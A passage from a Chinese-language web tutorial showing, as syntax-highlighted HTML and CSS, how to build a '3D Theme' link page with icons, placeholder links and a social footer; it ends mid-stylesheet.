class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">async</span> <span class="attr">defer</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>加入需要引入的資源，這裡主要加入字形、Icon</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span></span></span><br><span class="line"><span class="tag">      <span class="attr">href</span>=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span></span></span><br><span class="line"><span class="tag">      <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>3D Theme<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">async</span> <span class="attr">defer</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>加入各部分的內容</li></ol><p>首先加入圖片跟標題</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">  <span class="attr">alt</span>=<span class="string">&quot;User Photo&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;userPhoto&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;https://1.bp.blogspot.com/-v4Yi0oSR0-c/X1YRNalQZLI/AAAAAAAAA6U/xMnEQKBDgPgKFXQONoHthgMbQ91QURBlACLcBGAsYHQ/s0/technopreneur.jpg&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;userName&quot;</span>&gt;</span>3D Theme by Farell Faiz<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p>加入相關連結</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;links&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#yourLink&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span> <span class="attr">class</span>=<span class="string">&quot;fa fa-camera&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;#160;</span><span class="symbol">&amp;#160;</span>Photography</span><br><span class="line">    Submission&lt;/a</span><br><span class="line">  &gt;</span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#yourLink&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ri-discord-fill&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;#160;</span><span class="symbol">&amp;#160;</span>Discord</span><br><span class="line">    Server&lt;/a</span><br><span class="line">  &gt;</span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#yourLink&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span> <span class="attr">class</span>=<span class="string">&quot;fa fa-video-camera&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;#160;</span><span class="symbol">&amp;#160;</span>Zoom</span><br><span class="line">    Webinar Room&lt;/a</span><br><span class="line">  &gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Footer 加入社群連結，並且使用適當的 Icon</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#yourLink&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">i</span></span></span><br><span class="line"><span class="tag">      <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;fa fa-globe media&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">style</span>=<span class="string">&quot;line-height: 38px; font-size: 10px;&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#yourLink&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">i</span></span></span><br><span class="line"><span class="tag">      <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;fa fa-envelope-o media&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">style</span>=<span class="string">&quot;line-height: 38px; font-size: 10px;&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#yourLink&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">i</span></span></span><br><span class="line"><span class="tag">      <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;fa fa-comments-o media&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">style</span>=<span class="string">&quot;line-height: 38px; font-size: 10px;&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#yourLink&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">i</span></span></span><br><span class="line"><span class="tag">      <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;fa fa-instagram media&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">style</span>=<span class="string">&quot;line-height: 38px; font-size: 10px;&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="4"><li>最後結果</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span></span></span><br><span class="line"><span class="tag">      <span class="attr">href</span>=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span></span></span><br><span class="line"><span class="tag">      <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>3D Theme<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">      <span class="attr">alt</span>=<span class="string">&quot;User Photo&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">id</span>=<span class="string">&quot;userPhoto&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">src</span>=<span class="string">&quot;https://1.bp.blogspot.com/-v4Yi0oSR0-c/X1YRNalQZLI/AAAAAAAAA6U/xMnEQKBDgPgKFXQONoHthgMbQ91QURBlACLcBGAsYHQ/s0/technopreneur.jpg&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;userName&quot;</span>&gt;</span>3D Theme by Farell Faiz<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;links&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#yourLink&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span></span></span><br><span class="line"><span class="tag">        &gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span> <span class="attr">class</span>=<span class="string">&quot;fa fa-camera&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;#160;</span><span class="symbol">&amp;#160;</span>Photography</span><br><span class="line">        Submission&lt;/a</span><br><span class="line">      &gt;</span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#yourLink&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span></span></span><br><span class="line"><span class="tag">        &gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ri-discord-fill&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;#160;</span><span class="symbol">&amp;#160;</span>Discord</span><br><span class="line">        Server&lt;/a</span><br><span class="line">      &gt;</span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#yourLink&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span></span></span><br><span class="line"><span class="tag">        &gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span> <span class="attr">class</span>=<span class="string">&quot;fa fa-video-camera&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;#160;</span><span class="symbol">&amp;#160;</span>Zoom</span><br><span class="line">        Webinar Room&lt;/a</span><br><span class="line">      &gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#yourLink&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">i</span></span></span><br><span class="line"><span class="tag">          <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">class</span>=<span class="string">&quot;fa fa-globe media&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">style</span>=<span class="string">&quot;line-height: 38px; font-size: 10px;&quot;</span></span></span><br><span class="line"><span class="tag">        &gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#yourLink&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">i</span></span></span><br><span class="line"><span class="tag">          <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">class</span>=<span class="string">&quot;fa fa-envelope-o media&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">style</span>=<span class="string">&quot;line-height: 38px; font-size: 10px;&quot;</span></span></span><br><span class="line"><span class="tag">        &gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#yourLink&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">i</span></span></span><br><span class="line"><span class="tag">          <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">class</span>=<span class="string">&quot;fa fa-comments-o media&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">style</span>=<span class="string">&quot;line-height: 38px; font-size: 10px;&quot;</span></span></span><br><span class="line"><span class="tag">        &gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#yourLink&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">i</span></span></span><br><span class="line"><span class="tag">          <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">class</span>=<span class="string">&quot;fa fa-instagram media&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">style</span>=<span class="string">&quot;line-height: 38px; font-size: 10px;&quot;</span></span></span><br><span class="line"><span class="tag">        &gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">async</span> <span class="attr">defer</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="5"><li>加入 CSS</li></ol><p>引用字型並定義變數</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@import</span> url(<span class="string">&quot;https://fonts.googleapis.com/css?family=Karla:400,700&amp;display=swap&quot;</span>);</span><br><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">  <span class="attr">--font</span>: <span class="string">&quot;Karla&quot;</span>, <span class="string">&quot;Karla&quot;</span>, sans-serif;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>設定 RWD 的效果</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">700px</span>) &#123;</span><br><span class="line">  <span class="selector-id">#links</span> &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">3%</span>;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">3%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.night_mode</span> &#123;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">40%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最終結果</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Style Settings */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@import</span> url(<span class="string">&quot;https://fonts.googleapis.com/css?family=Karla:400,700&amp;display=swap&quot;</span>);</span><br><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">  <span class="attr">--font</span>: <span class="string">&quot;Karla&quot;</span>, <span class="string">&quot;Karla&quot;</span>, sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span 